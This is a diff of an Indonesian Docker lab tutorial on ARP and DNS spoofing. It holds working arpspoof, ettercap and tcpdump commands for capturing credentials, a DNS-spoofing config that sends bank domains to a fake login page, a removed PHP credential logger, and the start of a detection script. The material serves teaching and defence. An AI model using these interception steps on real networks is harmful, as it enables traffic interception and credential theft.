@@ -112,861 +112,708 @@ graph TD
 
 ## 3. Setup Lab dengan Docker Compose (Dengan Web Server Lokal)
 
-### 3.1 File docker-compose.yml
+### Langkah 1: Buat Folder Proyek di Terminal
+```bash
+cd ~
+mkdir -p lab-arp-kali
+cd lab-arp-kali
+```
 
-Buat file `docker-compose.yml` di folder `~/netsec-lab`:
+### Langkah 2: Buat file docker-compose.yml
+Buka **VS Code** dari folder proyek:
+```bash
+code .
+```
+
+Di VS Code, buat file baru `docker-compose.yml` dan copy-paste konfigurasi ini:
 
 ```yaml
 version: '3.8'
 
 services:
-  # Attacker - Kali Linux
-  kali-attacker:
-    image: kalilinux/kali-rolling
-    container_name: kali-attacker
-    hostname: attacker
+  # KORBAN 1 - Target utama
+  korban:
+    image: ubuntu:22.04
+    container_name: korban
+    hostname: korban-pc
     networks:
-      netsec_network:
-        ipv4_address: 192.168.1.100
+      lab_network:
+        ipv4_address: 172.20.0.10
+    cap_add:
+      - NET_ADMIN
+      - NET_RAW
+    privileged: false
+    tty: true
+    stdin_open: true
+    volumes:
+      - ./shared:/shared
+      - ./korban-files:/root/files
+    command: >
+      bash -c "
+      apt update &&
+      apt install -y curl nano iputils-ping net-tools tcpdump arp-scan inetutils-tools &&
+      echo 'Korban siap' &&
+      tail -f /dev/null
+      "
+
+  # WEBSERVER ASLI - Bank/Website target
+  web-asli:
+    image: nginx:alpine
+    container_name: web-asli
+    hostname: bank-asli
+    networks:
+      lab_network:
+        ipv4_address: 172.20.0.20
+    volumes:
+      - ./web-asli:/usr/share/nginx/html
+      - ./web-asli/logs:/var/log/nginx
+    ports:
+      - "8080:80"
+    command: >
+      sh -c "
+      apk add --no-cache curl &&
+      echo 'Web Asli siap di port 8080' &&
+      nginx -g 'daemon off;'
+      "
+
+  # WEBSERVER PALSU - Untuk demonstrasi DNS Spoofing
+  web-palsu:
+    image: nginx:alpine
+    container_name: web-palsu
+    hostname: bank-palsu
+    networks:
+      lab_network:
+        ipv4_address: 172.20.0.30
+    volumes:
+      - ./web-palsu:/usr/share/nginx/html
+      - ./web-palsu/logs:/var/log/nginx
+    ports:
+      - "8081:80"
+    command: >
+      sh -c "
+      echo 'Web Palsu siap di port 8081' &&
+      nginx -g 'daemon off;'
+      "
+
+  # GATEWAY/Router - Simulasi internet gateway
+  gateway:
+    image: alpine:latest
+    container_name: gateway
+    hostname: gateway
+    networks:
+      lab_network:
+        ipv4_address: 172.20.0.254
+    cap_add:
+      - NET_ADMIN
+      - NET_RAW
+    sysctls:
+      - net.ipv4.ip_forward=1
+    privileged: true
+    tty: true
+    stdin_open: true
+    volumes:
+      - ./shared:/shared
+    command: >
+      sh -c "
+      apk update &&
+      apk add iptables iproute2 net-tools tcpdump curl busybox-extras &&
+      echo 1 > /proc/sys/net/ipv4/ip_forward &&
+      iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE &&
+      echo 'Gateway siap di 172.20.0.254' &&
+      tail -f /dev/null
+      "
+
+  # PENYERANG - KALI LINUX (dengan semua tools)
+  penyerang:
+    image: kalilinux/kali-rolling
+    container_name: penyerang
+    hostname: kali-hacker
+    networks:
+      lab_network:
+        ipv4_address: 172.20.0.100
     cap_add:
       - NET_ADMIN
       - NET_RAW
       - SYS_ADMIN
+      - SYS_MODULE
     sysctls:
       - net.ipv4.ip_forward=1
       - net.ipv4.conf.all.forwarding=1
     privileged: true
-    stdin_open: true
     tty: true
+    stdin_open: true
     volumes:
       - ./shared:/shared
-      - ./webpages:/webpages
-    command: /bin/bash -c "apt update && apt install -y dsniff ettercap-graphical net-tools tcpdump nano vim curl wget iproute2 arp-scan isc-dhcp-client python3 && tail -f /dev/null"
-
-  # Target 1 - Ubuntu (Korban)
-  ubuntu-target:
-    image: ubuntu:22.04
-    container_name: ubuntu-target
-    hostname: target1
-    networks:
-      netsec_network:
-        ipv4_address: 192.168.1.10
-    cap_add:
-      - NET_ADMIN
-      - NET_RAW
-    privileged: true
-    stdin_open: true
-    tty: true
-    volumes:
-      - ./shared:/shared
-    command: /bin/bash -c "apt update && apt install -y net-tools tcpdump curl iputils-ping nano vim iproute2 arp-scan inetutils-tools isc-dhcp-client dnsutils && tail -f /dev/null"
-
-  # Web Server - Apache dengan PHP (Website Lokal)
-  webserver:
-    image: php:7.4-apache
-    container_name: webserver
-    hostname: webserver
-    networks:
-      netsec_network:
-        ipv4_address: 192.168.1.200
-    volumes:
-      - ./webserver/html:/var/www/html
-      - ./webserver/logs:/var/log/apache2
-    privileged: false
-    stdin_open: true
-    tty: true
-    command: /bin/bash -c "docker-php-ext-install mysqli && apache2-foreground"
-
-  # Web Server Palsu - Untuk DNS Spoofing
-  fake-webserver:
-    image: php:7.4-apache
-    container_name: fake-webserver
-    hostname: fake-webserver
-    networks:
-      netsec_network:
-        ipv4_address: 192.168.1.101
-    volumes:
-      - ./fake-webserver/html:/var/www/html
-    privileged: false
-    stdin_open: true
-    tty: true
-    command: /bin/bash -c "apache2-foreground"
-
-  # Router/Gateway
-  router:
-    image: alpine:latest
-    container_name: router
-    hostname: router
-    networks:
-      netsec_network:
-        ipv4_address: 192.168.1.1
-    cap_add:
-      - NET_ADMIN
-      - NET_RAW
-    sysctls:
-      - net.ipv4.ip_forward=1
-      - net.ipv4.conf.all.forwarding=1
-    privileged: true
-    stdin_open: true
-    tty: true
-    volumes:
-      - ./shared:/shared
-    command: /bin/sh -c "apk update && apk add iptables iproute2 net-tools tcpdump curl busybox-extras nano vim arp-scan dhcpcd && tail -f /dev/null"
+      - ./penyerang-tools:/tools
+      - ./penyerang-data:/data
+    command: >
+      bash -c "
+      apt update && 
+      apt install -y dsniff ettercap-common ettercap-graphical tcpdump net-tools iproute2 curl nano vim arp-scan nmap wireshark iptables arping python3 python3-pip git ca-certificates &&
+      pip3 install scapy --break-system-packages &&
+      echo 1 > /proc/sys/net/ipv4/ip_forward &&
+      echo 'KALI LINUX READY - ARP SPOOFING TOOLS INSTALLED' &&
+      echo 'Commands available: arpspoof, ettercap, tcpdump, nmap' &&
+      tail -f /dev/null
+      "
 
 networks:
-  netsec_network:
+  lab_network:
     driver: bridge
     ipam:
       config:
-        - subnet: 192.168.1.0/24
-          gateway: 192.168.1.254
+        - subnet: 172.20.0.0/16
 ```
 
-### 3.2 Buat Website Lokal
+### Langkah 3: Buat Struktur Folder di VS Code
+Di VS Code, buat folder-folder berikut (klik kanan -> New Folder):
+- `web-asli`
+- `web-palsu` 
+- `shared`
+- `korban-files`
+- `penyerang-tools`
+- `penyerang-data`
 
-```bash
-# Buat struktur folder
-cd ~/netsec-lab
-mkdir -p webserver/html webserver/logs fake-webserver/html shared
+Di dalam folder `web-asli`, buat folder lagi: `logs`
+Di dalam folder `web-palsu`, buat folder lagi: `logs`
 
-# Buat website asli (di webserver)
-cat > webserver/html/index.html << 'EOF'
+### Langkah 4: Buat File HTML Website Asli
+Di VS Code, buat file baru `web-asli/index.html`:
+
+```html
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Website Bank Lokal</title>
+    <meta charset="UTF-8">
+    <title>🏦 BANK NUSANTARA - Official Website</title>
     <style>
-        body { font-family: Arial; margin: 40px; }
-        .container { max-width: 500px; margin: auto; }
-        input { width: 100%; padding: 10px; margin: 5px 0; }
-        button { padding: 10px 20px; background: green; color: white; border: none; }
-        .warning { color: red; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Arial, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            width: 90%;
+            max-width: 450px;
+            padding: 40px;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            color: #333;
+            font-size: 28px;
+        }
+        .header .badge {
+            background: #4CAF50;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        .info-panel {
+            background: #e8f5e9;
+            border-left: 4px solid #4CAF50;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+        .info-panel .ip {
+            font-family: monospace;
+            background: #c8e6c9;
+            padding: 3px 8px;
+            border-radius: 3px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 500;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        .form-group input:focus {
+            border-color: #667eea;
+            outline: none;
+        }
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+        .btn-login:hover {
+            transform: translateY(-2px);
+        }
+        .footer {
+            margin-top: 25px;
+            text-align: center;
+            color: #999;
+            font-size: 12px;
+        }
+        .warning {
+            color: #f44336;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+        .status-aman {
+            color: #4CAF50;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Bank Lokal - Halaman Login</h1>
-        <div class="warning">Website ASLI (IP: 192.168.1.200)</div>
-        <form action="login.php" method="POST">
-            <input type="text" name="username" placeholder="Username" required><br>
-            <input type="password" name="password" placeholder="Password" required><br>
-            <button type="submit">Login</button>
+        <div class="header">
+            <h1>🏦 BANK NUSANTARA</h1>
+            <span class="badge">✅ WEBSITE RESMI</span>
+        </div>
+        
+        <div class="info-panel">
+            <strong>🔒 Koneksi Aman</strong><br>
+            Server: <span class="ip">172.20.0.20</span> (Web Asli)<br>
+            Status: <span class="status-aman">TERVERIFIKASI</span>
+        </div>
+
+        <form id="loginForm" method="POST" action="/login">
+            <div class="form-group">
+                <label>👤 Username / Nomor Rekening</label>
+                <input type="text" name="username" placeholder="Masukkan username" required>
+            </div>
+            
+            <div class="form-group">
+                <label>🔑 Password</label>
+                <input type="password" name="password" placeholder="Masukkan password" required>
+            </div>
+            
+            <button type="submit" class="btn-login">MASUK KE AKUN</button>
+            
+            <div class="warning">
+                * Hati-hati terhadap website palsu. Selalu periksa alamat website.
+            </div>
         </form>
+        
+        <div class="footer">
+            © 2024 Bank Nusantara. All rights reserved.<br>
+            IP Server: 172.20.0.20
+        </div>
     </div>
+
+    <script>
+        document.getElementById('loginForm').onsubmit = function(e) {
+            e.preventDefault();
+            const formData = new FormData(this);
+            
+            fetch('/login', {
+                method: 'POST',
+                body: new URLSearchParams(formData)
+            })
+            .then(response => response.text())
+            .then(data => {
+                alert('Login berhasil! (Simulasi)');
+                console.log('Login data:', Object.fromEntries(formData));
+            });
+        };
+    </script>
 </body>
 </html>
-EOF
-
-# Buat halaman login handler
-cat > webserver/html/login.php << 'EOF'
-<?php
-$username = $_POST['username'] ?? '';
-$password = $_POST['password'] ?? '';
-
-// Simpan log login
-$log = date('Y-m-d H:i:s') . " - User: $username - Pass: $password - IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
-file_put_contents('/var/log/apache2/login.log', $log, FILE_APPEND);
-?>
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Login Diproses</title>
-    <style>
-        body { font-family: Arial; margin: 40px; }
-        .container { max-width: 500px; margin: auto; }
-        .success { color: green; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1 class="success">Login Berhasil!</h1>
-        <p>Selamat datang, <?php echo htmlspecialchars($username); ?>!</p>
-        <p>Ini adalah website ASLI.</p>
-        <p><a href="index.html">Kembali</a></p>
-    </div>
-</body>
-</html>
-EOF
-
-# Buat website palsu (di fake-webserver)
-cat > fake-webserver/html/index.html << 'EOF'
-<!DOCTYPE html>
-<html>
-<head>
-    <title>⚠️ Website Bank - PERINGATAN ⚠️</title>
-    <style>
-        body { font-family: Arial; margin: 40px; background: #ffeeee; }
-        .container { max-width: 500px; margin: auto; border: 2px solid red; padding: 20px; }
-        input { width: 100%; padding: 10px; margin: 5px 0; }
-        button { padding: 10px 20px; background: red; color: white; border: none; }
-        .warning { color: red; font-weight: bold; }
-        .hidden { display: none; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1 class="warning">⚠️ PERINGATAN KEAMANAN ⚠️</h1>
-        <p>Ini adalah <strong>WEBSITE PALSU</strong> yang dibuat untuk demonstrasi ARP Spoofing!</p>
-        <p>IP: 192.168.1.101 (Fake Server)</p>
-        <hr>
-        <h2>Bank Lokal - Halaman Login</h2>
-        <form action="login.php" method="POST">
-            <input type="text" name="username" placeholder="Username" required><br>
-            <input type="password" name="password" placeholder="Password" required><br>
-            <button type="submit">Login (Berbahaya!)</button>
-        </form>
-    </div>
-</body>
-</html>
-EOF
-
-cat > fake-webserver/html/login.php << 'EOF'
-<?php
-$username = $_POST['username'] ?? '';
-$password = $_POST['password'] ?? '';
-
-// Simpan credential yang dicuri
-$log = date('Y-m-d H:i:s') . " - [CURIAN] User: $username - Pass: $password - IP Korban: " . $_SERVER['REMOTE_ADDR'] . "\n";
-file_put_contents('/var/www/html/stolen.txt', $log, FILE_APPEND);
-?>
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Login Diproses</title>
-    <style>
-        body { font-family: Arial; margin: 40px; background: #ffcccc; }
-        .container { max-width: 500px; margin: auto; }
-        .stolen { color: red; font-weight: bold; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1 class="stolen">⚠️ KREDENSIAL ANDA TELAH DICURI ⚠️</h1>
-        <p>Username: <?php echo htmlspecialchars($username); ?></p>
-        <p>Password: <?php echo htmlspecialchars($password); ?></p>
-        <p>Ini adalah DEMONSTRASI ARP Spoofing!</p>
-        <p>Dalam skenario nyata, Anda akan diarahkan ke website asli tanpa sadar.</p>
-        <p><a href="/stolen.txt">Lihat Log Curian</a></p>
-    </div>
-</body>
-</html>
-EOF
 ```
 
-### 3.3 Setup dan Jalankan Container
+### Langkah 5: Buat File HTML Website Palsu
+Buat file baru `web-palsu/index.html`:
+
+```html
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>⚠️ PERINGATAN - DEMO ARP SPOOFING ⚠️</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Arial, sans-serif; 
+            background: linear-gradient(135deg, #ff6b6b 0%, #c92a2a 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            width: 90%;
+            max-width: 450px;
+            padding: 40px;
+            border: 3px solid #ff0000;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            color: #c92a2a;
+            font-size: 28px;
+        }
+        .header .badge {
+            background: #ff4444;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        .warning-panel {
+            background: #fff3f3;
+            border-left: 4px solid #ff0000;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+        .warning-panel .ip {
+            font-family: monospace;
+            background: #ffe5e5;
+            padding: 3px 8px;
+            border-radius: 3px;
+            color: #c92a2a;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 500;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ffa8a8;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #ff6b6b 0%, #c92a2a 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .footer {
+            margin-top: 25px;
+            text-align: center;
+            color: #999;
+            font-size: 12px;
+        }
+        .demo-notice {
+            background: #000;
+            color: #ff0;
+            padding: 10px;
+            text-align: center;
+            font-weight: bold;
+            margin-top: 20px;
+            border-radius: 5px;
+        }
+        .stolen-badge {
+            background: #ff0;
+            color: #c00;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>⚠️ BANK NUSANTARA ⚠️</h1>
+            <span class="badge">❌ WEBSITE PALSU (DEMO)</span>
+        </div>
+        
+        <div class="stolen-badge">
+            🔴 PERINGATAN KEAMANAN 🔴<br>
+            Website ini adalah TIRUAN untuk demonstrasi ARP Spoofing
+        </div>
+        
+        <div class="warning-panel">
+            <strong>🚨 DETEKSI SERANGAN</strong><br>
+            Server: <span class="ip">172.20.0.30</span> (Web Palsu)<br>
+            Status: <strong style="color:#c00;">TIDAK AMAN - PALSU</strong>
+        </div>
+
+        <form id="loginForm" method="POST" action="/login">
+            <div class="form-group">
+                <label>👤 Username / Nomor Rekening</label>
+                <input type="text" name="username" placeholder="Masukkan username" required>
+            </div>
+            
+            <div class="form-group">
+                <label>🔑 Password</label>
+                <input type="password" name="password" placeholder="Masukkan password" required>
+            </div>
+            
+            <button type="submit" class="btn-login">LOGIN (BERBAHAYA!)</button>
+        </form>
+        
+        <div class="demo-notice">
+            ⚡ DEMO ARP SPOOFING ⚡<br>
+            Data login akan dicatat di /data/stolen_credentials.txt
+        </div>
+        
+        <div class="footer">
+            © 2024 Demonstrasi Keamanan Jaringan<br>
+            IP Server Palsu: 172.20.0.30
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').onsubmit = function(e) {
+            e.preventDefault();
+            const formData = new FormData(this);
+            const data = Object.fromEntries(formData);
+            
+            console.log('DATA DICURI:', data);
+            
+            fetch('/login', {
+                method: 'POST',
+                body: new URLSearchParams(formData)
+            })
+            .then(response => response.text())
+            .then(() => {
+                alert('⚠️ PERINGATAN: Data Anda telah direkam untuk demonstrasi!');
+            });
+        };
+    </script>
+</body>
+</html>
+```
+
+### Langkah 6: Buat File README untuk Penyerang
+Buat file baru `penyerang-data/README.txt`:
+
+```
+=== DATA HASIL SERANGAN ===
+
+Stolen credentials akan tercatat di file:
+- stolen_credentials.txt (dari tcpdump)
+- ettercap.log (dari ettercap)
+
+IP Penting (Network: 172.20.0.0/16):
+- Korban: 172.20.0.10
+- Web Asli: 172.20.0.20
+- Web Palsu: 172.20.0.30
+- Gateway: 172.20.0.254
+- Penyerang: 172.20.0.100
+
+Tools yang tersedia di Kali:
+- arpspoof : ARP spoofing
+- ettercap : MITM + DNS spoof
+- tcpdump : Packet capture
+- nmap : Network scanner
+- python3 + scapy : Custom script
+
+Cara menggunakan:
+1. arpspoof -i eth0 -t 172.20.0.10 172.20.0.20
+2. arpspoof -i eth0 -t 172.20.0.20 172.20.0.10
+3. echo 1 > /proc/sys/net/ipv4/ip_forward
+4. tcpdump -i eth0 -A port 80
+```
+
+### Langkah 7: Jalankan Lab
+Setelah semua file siap, jalankan di terminal:
 
 ```bash
-cd ~/netsec-lab
-
-# Jalankan container
+cd ~/lab-arp-kali
 docker-compose up -d
+```
 
-# Tunggu semua container siap
+### Langkah 8: Cek Status
+```bash
 docker-compose ps
-
-# Lihat log
-docker-compose logs -f
-```
-
-### 3.4 Verifikasi Container Berjalan
-
-```bash
-# Cek semua container
-docker ps
-
-# Output seharusnya:
-# - kali-attacker (192.168.1.100)
-# - ubuntu-target (192.168.1.10)
-# - webserver (192.168.1.200)
-# - fake-webserver (192.168.1.101)
-# - router (192.168.1.1)
-```
-
-### 3.5 Test Website Lokal
-
-**Dari target:**
-```bash
-# Test akses ke website asli
-curl http://192.168.1.200
-
-# Atau buka dengan browser (jika ada GUI)
-# http://192.168.1.200
-```
-
-**Dari attacker:**
-```bash
-# Test akses ke fake website
-curl http://192.168.1.101
-```
-
-### 3.6 Setup Internet Access (Opsional)
-
-Jika ingin akses internet juga:
-
-```bash
-# Di router
-iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
-```
-
-### 3.7 Buka Terminal untuk Setiap Container
-
-**Terminal 1 - Attacker:**
-```bash
-cd ~/netsec-lab
-docker-compose exec kali-attacker bash
-```
-
-**Terminal 2 - Target:**
-```bash
-cd ~/netsec-lab
-docker-compose exec ubuntu-target bash
-```
-
-**Terminal 3 - Router:**
-```bash
-cd ~/netsec-lab
-docker-compose exec router sh
+docker-compose logs -f penyerang
+# Tekan Ctrl+C setelah melihat "KALI LINUX READY"
 ```
 
 ---
 
-## 4. Hands-On: ARP Spoofing dengan arpspoof (dsniff)
+## **Bagian 2: Panduan Praktikum dengan IP Baru**
 
-### 4.1 Install Tools di Attacker
+### Buka Terminal untuk Setiap Container
 
+**Terminal 1 - Penyerang (Kali):**
 ```bash
-# Di attacker
-apt update
-apt install -y dsniff net-tools tcpdump
+docker exec -it penyerang bash
 ```
 
-### 4.2 Kondisi Normal - Sebelum Serangan
-
-**Di target:**
+**Terminal 2 - Korban:**
 ```bash
-# Cek ARP table
-arp -n
-
-# Akses website asli
-curl http://192.168.1.200
-
-# Cek koneksi ke webserver
-ping -c 3 192.168.1.200
+docker exec -it korban bash
 ```
 
-### 4.3 Aktifkan IP Forwarding di Attacker
-
+**Terminal 3 - Untuk monitoring:**
 ```bash
-# Di attacker
+docker exec -it korban bash
+# atau buka terminal baru
+```
+
+### IP Address yang Digunakan:
+- Korban: `172.20.0.10`
+- Web Asli: `172.20.0.20` (akses dari host: http://localhost:8080)
+- Web Palsu: `172.20.0.30` (akses dari host: http://localhost:8081)
+- Gateway: `172.20.0.254`
+- Penyerang: `172.20.0.100`
+
+### Langkah Praktikum (dengan IP baru)
+
+**1. Lihat kondisi normal di korban:**
+```bash
+# Catat MAC asli web asli
+arp -n | grep 172.20.0.20
+# Contoh output: 172.20.0.20 ether 02:42:ac:14:00:14
+```
+
+**2. Jalankan serangan dari penyerang:**
+```bash
+# Aktifkan IP forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
-cat /proc/sys/net/ipv4/ip_forward
-# Output: 1
+
+# Terminal A
+arpspoof -i eth0 -t 172.20.0.10 172.20.0.20
+
+# Terminal B (buka terminal penyerang baru)
+arpspoof -i eth0 -t 172.20.0.20 172.20.0.10
+
+# Terminal C - sniffing
+tcpdump -i eth0 -A port 80 | grep -E "user=|pass="
 ```
 
-### 4.4 Mulai ARP Spoofing - Target ke Web Server
-
-**Di attacker, buat 2 terminal:**
-
-**Terminal A - Spoof target (bohongi target bahwa attacker adalah webserver):**
+**3. Lihat perubahan di korban:**
 ```bash
-arpspoof -i eth0 -t 192.168.1.10 192.168.1.200
+arp -n | grep 172.20.0.20
+# MAC sekarang berubah menjadi MAC penyerang (02:42:ac:14:00:64)
 ```
 
-**Terminal B - Spoof webserver (bohongi webserver bahwa attacker adalah target):**
+**4. DNS Spoofing dengan IP baru:**
 ```bash
-arpspoof -i eth0 -t 192.168.1.200 192.168.1.10
-```
-
-### 4.5 Verifikasi ARP Spoofing Berhasil
-
-**Di target:**
-```bash
-# Cek ARP table
-arp -n | grep 192.168.1.200
-
-# MAC address webserver sekarang seharusnya MAC attacker
-# Contoh: 192.168.1.200 ether 02:42:c0:a8:01:64 (MAC attacker)
-```
-
-**Di webserver:**
-```bash
-# Masuk ke webserver
-cd ~/netsec-lab
-docker-compose exec webserver bash
-
-# Cek ARP table
-arp -n | grep 192.168.1.10
-# MAC address target sekarang seharusnya MAC attacker
-```
-
-### 4.6 Sniffing Traffic Login
-
-**Di attacker (Terminal C):**
-```bash
-# Sniff HTTP traffic
-tcpdump -i eth0 -n -A port 80
-
-# Atau simpan ke file
-tcpdump -i eth0 -w /shared/arp-spoof.pcap port 80
-```
-
-### 4.7 Simulasi Login dari Target
-
-**Di target:**
-```bash
-# Login ke website asli (tapi traffic lewat attacker)
-curl -X POST http://192.168.1.200/login.php \
-  -d "username=alice&password=rahasia123"
-
-# Atau gunakan form di browser
-# Buka http://192.168.1.200 di browser (jika ada GUI)
-```
-
-**Di attacker (Terminal C):**
-```bash
-# Akan terlihat POST request dengan credential
-# Contoh output:
-# POST /login.php HTTP/1.1
-# Host: 192.168.1.200
-# Content-Type: application/x-www-form-urlencoded
-# Content-Length: 33
-# 
-# username=alice&password=rahasia123
-```
-
-### 4.8 Lihat Log di Web Server
-
-**Di webserver:**
-```bash
-# Cek log login
-cat /var/log/apache2/login.log
-
-# Akan terlihat login dari IP attacker (bukan target)
-# Karena attacker yang meneruskan traffic
-```
-
----
-
-## 5. Hands-On: ARP Spoofing dengan Ettercap
-
-### 5.1 Install Ettercap
-
-```bash
-# Di attacker
-apt install -y ettercap-graphical
-```
-
-### 5.2 Mode Text-Based Ettercap
-
-```bash
-# Jalankan ettercap untuk spoof target ke webserver
-ettercap -T -i eth0 -M arp:remote /192.168.1.10// /192.168.1.200//
-
-# Penjelasan:
-# -T : Text mode
-# -i eth0 : Interface
-# -M arp:remote : ARP poisoning mode
-# Target: /IP korban// /IP webserver//
-```
-
-### 5.3 Melihat Hasil Sniffing
-
-Setelah menjalankan ettercap, akan terlihat:
-```
-HTTP : 192.168.1.10:54321 -> 192.168.1.200:80
-POST /login.php HTTP/1.1
-Host: 192.168.1.200
-username=alice&password=rahasia123
-```
-
-### 5.4 Simpan Hasil Capture
-
-```bash
-# Jalankan dengan output ke file
-ettercap -T -i eth0 -M arp:remote /192.168.1.10// /192.168.1.200// -w /shared/ettercap.pcap
-```
-
----
-
-## 6. Hands-On: DNS Spoofing dengan Web Lokal
-
-### 6.1 Setup DNS Spoofing
-
-**Di attacker:**
-
-```bash
-# Buat file konfigurasi DNS spoofing
-cat > /tmp/dns.spoof << 'EOF'
-# Arahkan domain ke fake webserver
-bank.local 192.168.1.101
-secure-bank.local 192.168.1.101
-login.bank.local 192.168.1.101
+# Di penyerang, buat file konfigurasi
+cat > /etc/ettercap/etter.dns << 'EOF'
+bank.local     A   172.20.0.30
+www.bank.local A   172.20.0.30
+bank.com       A   172.20.0.30
 EOF
+
+# Jalankan ettercap
+ettercap -T -i eth0 -M arp:remote /172.20.0.10// /172.20.0.254// -P dns_spoof
 ```
 
-### 6.2 Jalankan Ettercap dengan DNS Spoof
-
+**5. Test dari korban:**
 ```bash
-# Jalankan ettercap dengan plugin DNS spoof
-ettercap -T -i eth0 -M arp:remote /192.168.1.10// /192.168.1.1// -P dns_spoof
-
-# Setelah masuk, aktifkan plugin dns_spoof
-# Tekan 'p' → pilih nomor plugin dns_spoof
-```
-
-### 6.3 Konfigurasi DNS Spoof via File (Alternatif)
-
-```bash
-# Edit file konfigurasi ettercap
-nano /etc/ettercap/etter.dns
-
-# Tambahkan:
-bank.local A 192.168.1.101
-*.bank.local A 192.168.1.101
-
-# Jalankan
-ettercap -T -i eth0 -M arp:remote /192.168.1.10// /192.168.1.1// -P dns_spoof
-```
-
-### 6.4 Verifikasi dari Target
-
-**Di target:**
-```bash
-# Install dnsutils
-apt install -y dnsutils
-
-# Cek DNS server
-cat /etc/resolv.conf
-
-# Test DNS spoofing
 nslookup bank.local
-# Seharusnya mengarah ke 192.168.1.101 (fake webserver)
-
-# Ping domain
-ping -c 2 bank.local
-# Akan ping ke 192.168.1.101
-
-# Buka website dengan domain
+# Harusnya mengarah ke 172.20.0.30
 curl http://bank.local
-# Akan mendapatkan halaman palsu
+# Akan muncul website palsu
 ```
 
-### 6.5 Curi Credential dengan Fake Website
+### Script Monitoring dengan IP
 
-**Di target:**
+Buat file `monitor.sh` di VS Code dan simpan di folder `korban-files`:
+
 ```bash
-# Korban mengira mengakses website asli
-curl -X POST http://bank.local/login.php \
-  -d "username=bob&password=secret123"
-```
-
-**Di fake-webserver:**
-```bash
-# Lihat credential yang tercuri
-cd ~/netsec-lab
-docker-compose exec fake-webserver bash
-cat /var/www/html/stolen.txt
-
-# Output:
-# 2025-02-25 14:30:15 - [CURIAN] User: bob - Pass: secret123 - IP Korban: 192.168.1.10
-```
-
----
-
-## 7. Deteksi dan Pencegahan
-
-### 7.1 Deteksi ARP Spoofing Manual
-
-**Di target, buat script deteksi:**
-```bash
-cat > /tmp/check_arp.sh << 'EOF'
 #!/bin/bash
 
-# Ganti dengan MAC asli webserver
-REAL_WEB_MAC="02:42:c0:a8:01:c8"  # MAC webserver asli
+REAL_MAC="02:42:ac:14:00:14"  # Ganti dengan MAC asli web asli
+GATEWAY_MAC="02:42:ac:14:00:fe"  # MAC gateway
+
+echo "Monitoring ARP Table - 172.20.0.0/16"
+echo "MAC Asli Web Asli: $REAL_MAC"
+echo "========================================"
 
 while true; do
-    CURRENT_MAC=$(arp -n | grep 192.168.1.200 | awk '{print $3}')
+    clear
+    echo "Waktu: $(date '+%H:%M:%S')"
+    echo "----------------------------------------"
     
-    if [ "$CURRENT_MAC" != "$REAL_WEB_MAC" ]; then
-        echo "$(date): ⚠️ PERINGATAN! ARP Spoofing terdeteksi!"
-        echo "Webserver MAC asli: $REAL_WEB_MAC"
-        echo "Webserver MAC sekarang: $CURRENT_MAC"
+    WEB_MAC=$(arp -n | grep 172.20.0.20 | awk '{print $3}')
+    GW_MAC=$(arp -n | grep 172.20.0.254 | awk '{print $3}')
+    
+    echo "Web Asli (172.20.0.20): $WEB_MAC"
+    echo "Seharusnya: $REAL_MAC"
+    echo "Gateway (172.20.0.254): $GW_MAC"
+    
